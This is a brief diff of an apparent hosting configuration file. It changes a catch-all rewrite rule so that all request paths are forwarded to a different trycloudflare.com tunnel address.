@@ -2,7 +2,7 @@
   "rewrites": [
     {
       "source": "/(.*)",
-      "destination": "https://riders-counseling-determines-nations.trycloudflare.com/$1"
+      "destination": "https://janet-lesser-acquisition-anyone.trycloudflare.com/$1"
     }
   ]
 }
